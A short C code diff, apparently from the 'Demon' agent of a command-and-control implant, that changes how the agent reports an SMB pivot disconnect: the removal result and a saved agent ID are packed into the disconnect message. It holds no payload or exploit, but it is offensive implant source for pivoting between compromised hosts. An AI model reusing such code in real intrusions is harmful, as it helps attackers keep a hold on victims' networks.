@@ -264,12 +264,13 @@ VOID PivotCollectOutput()
                         // Sends already read data.
                         PackageTransmit( Package, NULL, NULL );
 
+                        DWORD DemonID = TempList->DemonID;
+
                         Package = PackageCreate( DEMON_COMMAND_PIVOT );
                         PackageAddInt32( Package, DEMON_PIVOT_SMB_DISCONNECT );
-                        PackageAddInt32( Package, TempList->DemonID );
+                        PackageAddInt32( Package, PivotRemove( TempList->DemonID ) );
+                        PackageAddInt32( Package, DemonID );
                         PackageTransmit( Package, NULL, NULL );
-
-                        PivotRemove( TempList->DemonID );
 
                         return;
                     }
